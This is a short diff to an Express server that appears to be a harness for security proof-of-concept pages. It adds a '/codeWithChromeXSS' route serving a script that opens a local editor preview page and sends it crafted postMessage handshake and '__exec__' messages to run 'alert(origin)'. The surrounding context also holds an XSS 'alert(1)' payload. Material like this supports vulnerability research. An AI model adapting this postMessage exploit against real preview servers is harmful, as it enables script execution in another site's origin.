@@ -66,6 +66,13 @@ app.get("/tsv", function (req, res) {
   <-'alert(1)-'>	123456	12.45`);
 });
 
+
+app.get("/codeWithChromeXSS", function (req, res) {
+
+
+  res.send(`<script>let x = window.open('http://127.0.0.1:8090/preview/untitled_phaser_blockly_file.html');window.addEventListener("message", a=> {  x.postMessage({name: "__exec__", value:"alert(origin)"}, "*");});setTimeout(()=> x.postMessage({name: "__handshake__", value:"1307"}, "*"), 500)</script>`);
+});
+
 app.get("/test", function (req, res) {
   const headers = req.query.header ? JSON.parse(req.query.header) : [] ;
   for (const header in headers) {
